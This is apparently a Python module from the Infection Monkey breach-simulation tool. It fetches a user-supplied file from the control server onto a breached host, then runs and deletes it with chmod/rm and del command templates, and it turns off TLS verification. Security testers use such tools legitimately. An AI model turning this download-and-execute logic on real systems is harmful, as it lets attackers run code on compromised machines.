from infection_monkey.post_breach.pba import PBA
from infection_monkey.control import ControlClient
import infection_monkey.monkeyfs as monkeyfs
from infection_monkey.config import WormConfiguration
import requests
import shutil
import os
import logging

LOG = logging.getLogger(__name__)

__author__ = 'VakarisZ'

DOWNLOAD_CHUNK = 1024
DEFAULT_LINUX_COMMAND = "chmod +x {0} ; {0} ; rm {0}"
DEFAULT_WINDOWS_COMMAND = "{0} & del {0}"


class FileExecution(PBA):
    def __init__(self, linux_command="", windows_command=""):
        self.linux_file_info = WormConfiguration.custom_post_breach['linux_file_info']
        self.windows_file_info = WormConfiguration.custom_post_breach['windows_file_info']
        super(FileExecution, self).__init__("File execution", linux_command, windows_command)

    def execute_linux(self):
        FileExecution.download_PBA_file(FileExecution.get_dest_dir(WormConfiguration, True),
                                        self.linux_file_info['name'],
                                        self.linux_file_info['size'])
        return super(FileExecution, self).execute_linux()

    def execute_win(self):
        FileExecution.download_PBA_file(FileExecution.get_dest_dir(WormConfiguration, True),
                                        self.windows_file_info['name'],
                                        self.windows_file_info['size'])
        return super(FileExecution, self).execute_win()

    def add_default_command(self, is_linux):
        if is_linux:
            file_path = os.path.join(FileExecution.get_dest_dir(WormConfiguration, is_linux=True),
                                     self.linux_file_info["name"])
            self.linux_command = DEFAULT_LINUX_COMMAND.format(file_path)
        else:
            file_path = os.path.join(FileExecution.get_dest_dir(WormConfiguration, is_linux=False),
                                     self.windows_file_info["name"])
            self.windows_command = DEFAULT_WINDOWS_COMMAND.format(file_path)

    @staticmethod
    def download_PBA_file(dst_dir, filename, size):
        """
        Handles post breach action file download
        :param dst_dir: Destination directory
        :param filename: Filename
        :param size: File size in bytes
        :return: True if successful, false otherwise
        """
        PBA_file_v_path = FileExecution.download_PBA_file_to_vfs(filename, size)
        try:
            with monkeyfs.open(PBA_file_v_path, "rb") as downloaded_PBA_file:
                with open(os.path.join(dst_dir, filename), 'wb') as written_PBA_file:
                    shutil.copyfileobj(downloaded_PBA_file, written_PBA_file)
            return True
        except IOError as e:
            LOG.error("Can not download post breach file to target machine, because %s" % e)
            return False

    @staticmethod
    def download_PBA_file_to_vfs(filename, size):
        if not WormConfiguration.current_server:
            return None
        try:
            dest_file = monkeyfs.virtual_path(filename)
            if (monkeyfs.isfile(dest_file)) and (size == monkeyfs.getsize(dest_file)):
                return dest_file
            else:
                download = requests.get("https://%s/api/pba/download/%s" %
                                        (WormConfiguration.current_server, filename),
                                        verify=False,
                                        proxies=ControlClient.proxies)

                with monkeyfs.open(dest_file, 'wb') as file_obj:
                    for chunk in download.iter_content(chunk_size=DOWNLOAD_CHUNK):
                        if chunk:
                            file_obj.write(chunk)
                    file_obj.flush()
                if size == monkeyfs.getsize(dest_file):
                    return dest_file

        except Exception as exc:
            LOG.warn("Error connecting to control server %s: %s",
                     WormConfiguration.current_server, exc)

    @staticmethod
    def get_dest_dir(config, is_linux):
        """
        Gets monkey directory from config. (We put post breach files in the same dir as monkey)
        """
        if is_linux:
            return os.path.dirname(config.dropper_target_path_linux)
        else:
            return os.path.dirname(config.dropper_target_path_win_32)
